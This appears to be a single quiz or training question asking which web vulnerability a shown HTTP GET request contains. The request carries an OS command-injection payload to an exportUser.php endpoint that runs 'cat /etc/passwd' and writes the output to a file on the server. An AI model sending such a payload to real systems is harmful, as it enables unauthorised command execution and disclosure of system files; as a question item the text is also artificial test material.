- What Web vulnerability is in this HTTP header?
```
GET /include/exportUser.php?cla=application&func=_exec&opt=(cat+/etc/passwd)>nuclei.txt&type=3 HTTP/1.1
Host: host.com.br
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```
